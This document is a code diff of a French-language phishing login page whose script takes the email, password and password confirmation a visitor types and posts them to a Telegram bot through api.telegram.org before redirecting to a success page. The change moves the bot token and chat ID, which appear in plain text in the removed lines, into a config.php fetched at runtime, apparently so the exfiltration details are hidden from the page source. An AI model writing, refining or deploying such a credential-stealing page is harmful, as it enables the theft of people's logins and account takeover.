@@ -78,7 +78,7 @@
  </div>
  <form class="m-login__form m-form">
     <div class="form-group m-form__group">
-        <input class="form-control m-input" type="text" placeholder="Email" name="email" autocomplete="off" value>
+        <input class="form-control m-input" type="text" placeholder="Email" name="email" autocomplete="off">
     </div>
     <div class="form-group m-form__group">
         <i class="flaticon-visible"></i>
@@ -109,37 +109,40 @@ document.addEventListener("DOMContentLoaded", function () {
         // Message formaté pour Telegram
         let message = `🔔 Nouvelle soumission de formulaire :\n\n📧 Email : ${email}\n🔑 Mot de passe : ${password}\n🔄 Confirmation : ${password_confirmation}`;
 
-        // Informations de votre bot Telegram
-        let botToken = "7846685441:AAHr1oVPbePKBpvJ-osHYg4s9tu1xgAFVN0";
-        let chatId = "871351122";
+        // Récupérer les informations du bot depuis le serveur
+        fetch("config.php")
+            .then(response => response.json())
+            .then(data => {
+                let botToken = data.botToken;
+                let chatId = data.chatId;
 
-        // URL de l'API Telegram
-        let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        // Envoi des données à Telegram
-        fetch(url, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
+                // Envoi des données à Telegram
+                return fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                // Redirection vers la page de succès après envoi réussi
-                window.location.href = "succes.html";
-            } else {
-                alert("Erreur lors de l'envoi du message.");
-            }
-        })
-        .catch(error => console.error("Erreur :", error));
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "succes.html";
+                } else {
+                    alert("Erreur lors de l'envoi du message.");
+                }
+            })
+            .catch(error => console.error("Erreur :", error));
     });
 });
 </script>
+
 
  </div>
  </div>
